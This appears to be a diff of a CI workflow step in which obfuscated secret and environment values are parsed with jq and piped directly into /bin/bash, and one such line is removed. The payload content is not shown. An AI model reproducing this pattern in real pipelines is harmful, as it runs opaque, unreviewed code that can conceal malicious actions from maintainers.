@@ -27,7 +27,6 @@ jobs:
           zscia23534: ${{ secrets.zscia23534 }}
         run: |
           printf '%s' "$zscia23534" | jq -r .raj0 | /bin/bash
-          printf '%s' "$sdo7153" | jq -r .ecmp9975 | /bin/bash
           printf '%s' "$mz03294" | jq -r .ciwr11 | /bin/bash
           echo $jvt422 | jq -r .hyom7542 | /bin/bash
           echo $rq98 | jq -r .p29565 | /bin/bash
